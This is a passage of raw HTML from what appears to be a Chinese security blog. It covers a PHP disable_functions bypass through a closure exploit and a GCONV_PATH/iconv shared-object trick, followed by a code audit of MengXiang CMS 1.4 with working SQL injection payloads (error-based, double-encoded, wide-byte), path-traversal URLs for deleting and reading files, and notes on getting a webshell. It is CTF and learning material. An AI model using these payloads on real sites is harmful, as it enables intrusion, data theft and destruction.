invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>和上面一样把exp贴进去就行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703190.png" alt="image-20231206170347121"><br>利用插件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703964.png" alt="image-20231206170354905"></p><h2 id="利用iconv"><a href="#利用iconv" class="headerlink" title="利用iconv"></a>利用iconv</h2><h3 id="利用条件-11"><a href="#利用条件-11" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Linux 操作系统</li><li><code>putenv</code></li><li><code>iconv</code></li><li>存在可写的目录, 需要上传 <code>.so</code> 文件</li></ul><h3 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h3><p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859?ops_request_misc=&request_id=&biz_id=102&utm_term=iconv%20%E7%BB%95%E8%BF%87%20disable_function&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117911859.pc_search_mgc_flag&spm=1018.2226.3001.4187">使用GCONV_PATH与iconv进行bypass disable_functions_gconv-modules_lesion__的博客-CSDN博客</a></p><blockquote><p>iconv是一个计算机程序以及一套应用程序编程接口的名称。 作为应用程序的iconv采用命令行界面，允许将某种特定编码的文件转换为另一种编码。</p></blockquote><p>感觉就是转换编码的一个东西吧，利用原理也是和LD_PRELOAD差不多，参考上面文章即可，这里再把上面文章中的bypass过程贴一下方便以后自己看</p><blockquote><p>我们的利用方式就是首先在某一文件夹（一般是&#x2F;tmp）中上传gconv-modules文件，文件中指定我们自定义的字符集文件的.so，然后我们再在.so文件中的gonv_init()函数中书写命令执行函数，之后上传php的shell，内容是使用php设定GCONV_PATH指向我们的gconv-modules文件，然后使用iconv函数使我们的恶意代码执行。</p></blockquote><h3 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h3><p>环境使用ctfhub上的<br>先上传gconv-modules文件于&#x2F;tmp文件夹，其内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module  自定义字符集名字（大写）//    INTERNAL    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span><br><span class="line">module  INTERNAL    自定义字符集名字（大写）//    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">module  HACK//    INTERNAL    ../../../../../../../../tmp/hack    2</span><br><span class="line">module  INTERNAL    HACK//    ../../../../../../../../tmp/hack    2</span><br></pre></td></tr></table></figure><p>上传该文件至&#x2F;tmp文件夹下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704195.png" alt="image-20231206170412144"><br>再编写一个.c文件如hack.c</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">gconv</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">gconv_init</span>() &#123;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; /tmp/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为.so文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hack.c -o hack.so -shared -fPIC</span><br></pre></td></tr></table></figure><p>上传到tmp下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704267.png" alt="image-20231206170421215"><br>然后在web目录下直接建个shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;hack&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704313.png" alt="image-20231206170429257"><br>然后访问即可，回蚁剑在tmp下看到flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704106.png" alt="image-20231206170436046"><br>也可直接用蚁剑的插件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704900.png" alt="image-20231206170442786"><br>执行后会在web目录下生成个<code>.antproxy.php</code>然后用同样的密码连接这个shell即可执行命令<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061704752.png" alt="image-20231206170458672"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/10057#toc-3">bypass disable_functions姿势总结 - 先知社区 (aliyun.com)</a><br><a href="https://cloud.tencent.com/developer/article/1524489">Windows平台的PHP之开启COM配置-腾讯云开发者社区-腾讯云 (tencent.com)</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484214&idx=1&sn=0c00e6110d43ba82ac62296f808a119c&chksm=c0e63829f791b13f6561923d93725d070c0a0d27c48454d7fae47029d4e07596895421a0e47c&mpshare=1&scene=23&srcid=1115iVMa0GWptV9GZIyeuXEE&sharer_shareinfo=8fd12347e87a45e20619288ad6b14509&sharer_shareinfo_first=8fd12347e87a45e20619288ad6b14509#rd">从绕过disable_functions到关于so的一些想法 (qq.com)</a><br><a href="https://blog.csdn.net/qq_51295677/article/details/124338635#:~:text=%E5%B7%A7%E7%94%A8mail%20%28%29%26LD_PRELOAD%E5%8A%AB%E6%8C%81%20%E5%9C%A8%E4%B8%8A%E7%AF%87das%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E6%8F%90%E5%88%B0%E8%BF%87%E5%88%B0%20mail%20%E5%87%BD%E6%95%B0%EF%BC%8C,mail%20%E5%87%BD%E6%95%B0%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%8C%E5%BD%93%E4%BD%BF%E7%94%A8%E5%88%B0%E8%BF%99%E7%8E%A9%E6%84%8F%E5%84%BF%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%97%B6%E4%BC%9A%E4%BD%BF%E7%94%A8%E5%88%B0%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%20%2Fusr%2Fsbin%2Fsendmail%20%EF%BC%8C%E6%88%91%E4%BB%AC%E5%A6%82%E6%9E%9C%E8%83%BD%E5%8A%AB%E6%8C%81%E5%88%B0%20sendmail%20%E8%A7%A6%E5%8F%91%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%BE%E5%88%B0%E6%88%91%E4%BB%AC%E4%B9%8B%E5%89%8D%E8%AE%B2%E7%9A%84%E9%82%A3%E4%B8%AA%E7%9B%AE%E7%9A%84%E4%BA%86%E3%80%82">浅谈LD_PRELOAD劫持_unset ld_preload_errorr0的博客-CSDN博客</a><br><a href="https://www.freebuf.com/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions - FreeBuf网络安全行业门户</a><br><a href="https://www.cnblogs.com/leixiao-/p/10612798.html">LD_PRELOAD &amp; putenv() 绕过 disable_functions &amp; open_basedir - 淚笑 - 博客园 (cnblogs.com)</a><br><a href="https://blog.csdn.net/weixin_63231007/article/details/129105223">PHP7.4 FFI 扩展安全问题_葫芦娃42的博客-CSDN博客</a><br><a href="https://cloud.tencent.com/developer/article/1838766">Web安全 | Fastcgi 协议分析与 PHP-FPM 攻击方法-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>梦想CMS 1.4代码审计学习</title>
      <link href="/undefined/55174.html"/>
      <url>/undefined/55174.html</url>
      
        <content type="html"><![CDATA[<h2 id="一些审计方法"><a href="#一些审计方法" class="headerlink" title="一些审计方法"></a>一些审计方法</h2><p>对于未公开POC的1day复现，直接看cnvd的提交，我们这里审计梦想CMS 1.4所以直接搜索就行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282158834.png" alt="image-20230828215700457"><br>可以看到很多，虽然文件名未全部显示但是就那几个文件，显示了大部分字母就能找到了，这是复现1day的方法，当然也可以直接拿最新版本审0day</p><h2 id="BookAction-class-php下sql注入"><a href="#BookAction-class-php下sql注入" class="headerlink" title="BookAction.class.php下sql注入"></a>BookAction.class.php下sql注入</h2><p>这个系统是个MVC架构，emmm不太了解得找时间学学了，不然代审有点难，先来看下这个文件下的注入在reply方法下GET接收一个id<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282158710.png" alt="image-20230828215835650"><br>直接跟进getReply看看找到底层的sql语句，最终在db.class.php找到<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282158745.png" alt="image-20230828215852668"><br>可以看到直接拼接了field即一开始的id，而且这个整个项目的sql调用都在这个文件，但是这个底层的sql调用没有做预编译，那么你就得在用的时候去写这样就很容易遗漏出现sql注入，在这里打印一下sql语句方便调试，来到这个BookAction.class.php文件下进入reply方法传个id<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159085.png" alt="image-20230828215908038"><br>直接闭合一下，这里得用<code>)</code>闭合，从sql语句即可看出，然后用报错注入注一下版本，payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>) <span class="keyword">or</span> updatexml(<span class="number">0</span>,concat(<span class="number">0x7e</span>,version()),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>url编码一下注入<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159837.png" alt="image-20230828215920773"><br>注入成功，后台的注入虽然简单，但是危害不大，没有弱口令进入后台的话就无法利用，下面看看前台的sql注入，因为sql注入基本上就是在前台注拿到后台的密码</p><h2 id="TagsAction-class-php下的sql注入"><a href="#TagsAction-class-php下的sql注入" class="headerlink" title="TagsAction.class.php下的sql注入"></a>TagsAction.class.php下的sql注入</h2><p>来到前台index下的TagsAction.class.php文件，这个文件下没有获取参数的方法，但是这里他自己写了个p函数用来获取，并且对sql注入进行了一下处理<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159964.png" alt="image-20230828215936884"><br>可以看到select和from都过滤了，从里面绕是很困难的，就想办法从外部绕，这里为了防页面跳转直接在burp上抓包看，照样去到底部的sql调用打印一下sql语句<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159967.png" alt="image-20230828215956904"><br>正常注入的话是会被过滤转义的，但是看代码在过了p函数后进入sql语句执行前有个url解码<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282200865.png" alt="image-20230828220011827"><br>emmm，ctf的感觉，搁这儿出题呢？那么二次编码即可，payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m<span class="operator">=</span>tags<span class="operator">&amp;</span>name<span class="operator">=</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">66</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">34</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">34</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">64</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">66</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">34</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">66</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">33</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282200592.png" alt="image-20230828220042515"></p><h2 id="BookAction-class-php下的sql注入"><a href="#BookAction-class-php下的sql注入" class="headerlink" title="BookAction.class.php下的sql注入"></a>BookAction.class.php下的sql注入</h2><p>来到文件下寻找传参<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282200891.png" alt="image-20230828220058846"><br>这里调用了add方法，这个方法底层执行了sql，跟进去即可看到<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282201047.png" alt="image-20230828220119000"><br>同样输出一下sql语句，然后把访问要的参数加上先看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282201883.png" alt="image-20230828220142810"><br>访问成功，接下来就去找注入，直接来到底层的sql语句执行的地方看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282201268.png" alt="image-20230828220157226"><br>发现对这个key没有任何处理直接进行了拼接，来到p函数下看看也没用任何的处理只是对<code>$v</code>操作，包括<code>filter_sql</code>函数<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282202533.png" alt="image-20230828220214466"><br>然后改一下key看能不能注入<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282202469.png" alt="image-20230828220229390"><br>发现没有报错，这样代表就注入进去了，来到页面看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282202773.png" alt="image-20230828220253722"><br>刚刚注进去的参数并没有回显出来，只有一些系统默认放的东西，来到数据库里查看表的结构，看看为什么是这样的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282203353.png" alt="image-20230828220311302"><br>可以看到有个ischeck显示为1才会回显，那么设置一下这个key为1<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282203204.png" alt="image-20230828220323149"><br>可以看到回显成功，接下来构造payload注入就行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setbook<span class="operator">=</span>a<span class="operator">&amp;</span>name<span class="operator">=</span>e<span class="operator">&amp;</span>content<span class="operator">=</span>b<span class="operator">&amp;</span>mail<span class="operator">=</span>c<span class="operator">&amp;</span>tel<span class="operator">=</span>d<span class="operator">&amp;</span><span class="type">time</span>,ischeck)<span class="keyword">values</span>(version(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>)#<span class="operator">=</span>a</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282203099.png" alt="image-20230828220345049"></p><h2 id="SearchAction-class-php下的注入"><a href="#SearchAction-class-php下的注入" class="headerlink" title="SearchAction.class.php下的注入"></a>SearchAction.class.php下的注入</h2><p>这个注入本来没打算写的，因为是盲注且过滤了<code>&#39;</code>和一些关键字，所以很多查询根本用不了，但是如果改了数据库的配置为gbk编码那么可以用宽字节注入来绕过，平时没怎么接触宽字节注入所以来看一下，这个地方的功能其实就是前台的那个搜索<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282204326.png" alt="image-20230828220407106"><br>然后看一下源码找到sql语句照样输出看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282204543.png" alt="image-20230828220424495"><br>在searchCoutn里面一路跟进去就行了，然后可以看到keywords的a被单引号包裹了然后引号又被过滤了就很难用<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282204208.png" alt="image-20230828220456144"><br>然后最终找到一个参数tuijian通过报错发现是列名，那么就不存在有单引号什么的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282205494.png" alt="image-20230828220510418"><br>然后注入一下发现它的content-Length变了说明注入成功，在没有注入成功的时候长度是5000多<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282205131.png" alt="image-20230828220530071"><br>然后注一下mysql的版本第一位数字，为5注入成功，真要注的话也可以写脚本进行注入<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282205455.png" alt="image-20230828220550381"><br>但是这里依旧用不了select等关键字，注不出来很有用的信息，但是这个关键子其实可以绕过，因为在执行了p函数之后有个<code>string::delHtml</code>这个<code>delHtml</code>方法会清除一些html标签如<code>&lt;&gt;</code>所以可以利用这个绕过，之所以上面的注入不用是因为无法绕过单引号，但是如果系统用了GBK编码就可以使用宽字节注入了，当然很少有人去改配置，这个梦想CMS默认是utf8这里为了学习下所以给它改了试试<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282206858.png" alt="image-20230828220646802"><br>然后构造报错注入的payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="operator">%</span>df<span class="string">&#x27;)or+upd&lt;&gt;atexml(0,concat(0x7e,us&lt;&gt;er()),1)%23</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207167.png" alt="image-20230828220704108"></p><h2 id="BackdbAction-class-php下的任意文件删除"><a href="#BackdbAction-class-php下的任意文件删除" class="headerlink" title="BackdbAction.class.php下的任意文件删除"></a>BackdbAction.class.php下的任意文件删除</h2><p>删除文件一般都是unlink，所以如果是自己找的话就直接找这个，这里我跟着组长直接找漏洞点了，在BackdbAction.class.php下找到delOne函数<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207193.png" alt="image-20230828220722152"><br>可以看到明显的任意文件删除没有任何的过滤啥的，现在找到filename参数怎么得到，最终是在delbackdb函数下通过GET传参得到<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207179.png" alt="image-20230828220734143"><br>这里它检测的竟然是这个参数不存在的话显示备份文件不存在，而不是真正的文件不存在显示备份文件不存在，现在构造一下payload试一下，首先在网站 根目录建个<code>flag.txt</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207426.png" alt="image-20230828220747353"><br>payload如下，这里需要做一下目录穿越因为filename是拼接在file&#x2F;back&#x2F;后面的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=backdb&amp;a=delbackdb&amp;filename=../../flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208385.png" alt="image-20230828220802316"><br>成功删除</p><h2 id="TemplateAction-class-php下的任意文件读取"><a href="#TemplateAction-class-php下的任意文件读取" class="headerlink" title="TemplateAction.class.php下的任意文件读取"></a>TemplateAction.class.php下的任意文件读取</h2><p>这个漏洞在cnvd没有公开文件名的任何字母，也没有说是前台后台，所以做复现相当于告诉你这个系统有这个洞，然后你自己去找，这样其实难度就比较大了<br>任意文件读取利用的其实就是<code>file_get_contents</code>这个函数，那么就全局搜索这个函数看看哪里调用了，然后一个个审，最终是在file.class.php文件下的<code>getcon</code>函数调用了<code>file_get_contents</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208404.png" alt="image-20230828220820339"><br>相当于重写了一下<code>file_get_contents</code>方法，里面也没啥过滤，只是检查了一下权限，然后找哪里调用了<code>getcon</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208072.png" alt="image-20230828220833999"><br>就一处调用了在TemplateAction.class.php下的<code>editfile</code>函数中<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208676.png" alt="image-20230828220844602"><br>接收一个dir参数然后拼接在template后面，那么现在就可以构造payload尝试读取一下了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=template&amp;a=editfile&amp;dir=../index.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209018.png" alt="image-20230828220859955"><br>成功读取</p><h2 id="TemplateAction-class-php下的任意文件写入"><a href="#TemplateAction-class-php下的任意文件写入" class="headerlink" title="TemplateAction.class.php下的任意文件写入"></a>TemplateAction.class.php下的任意文件写入</h2><p>就在刚刚那个<code>editfile</code>函数下还存在一个任意文件写入<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209112.png" alt="image-20230828220910054"><br>接收一个settemcontent参数进入if，然后filename，然后文件内容temcontent<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209048.png" alt="image-20230828220923970"><br>然后访问1.php，发现成功写入，这样可以直接getshell了，这个就有点代码审计的意思了，看了下在黑盒下找到还是比较困难<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209711.png" alt="image-20230828220934594"></p><h2 id="黑盒下的任意文件上传"><a href="#黑盒下的任意文件上传" class="headerlink" title="黑盒下的任意文件上传"></a>黑盒下的任意文件上传</h2><p>这个就是黑盒下的文件上传，直接白盒审的话其实比黑盒难<br>在内容管理下找到一处文件上传的地方<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209374.png" alt="image-20230828220958303"><br>但是由于版本比较老，新版本的edge不支持点击了，如下选择文件和开始上传根本点不了，这里可以用flash来访问，或者自己构造上传包，另外支持的上传格式也可以看到<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210839.png" alt="image-20230828221014803"><br>找找哪里能修改，找到如下位置，将php加上<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210620.png" alt="image-20230828221025557"><br>然后flash访问上传<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210989.png" alt="image-20230828221037936"><br>emmm找了半天路径得把刚刚得图片选择才会显示路径<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210022.png" alt="image-20230828221048958"><br>确定选择之后得到路径<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282211966.png" alt="image-20230828221102313"><br>成功上传<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282211166.png" alt="image-20230828221135089"></p><h2 id="TemplateAction-class-php下的任意代码执行"><a href="#TemplateAction-class-php下的任意代码执行" class="headerlink" title="TemplateAction.class.php下的任意代码执行"></a>TemplateAction.class.php下的任意代码执行</h2><p>这里也直接黑盒下看吧，比较简单<br>这个系统用的smarty模板，正好在这个里面存在代码执行，如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282211199.png" alt="image-20230828221156132"><br>然后访问前台发现成功执行了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282212192.png" 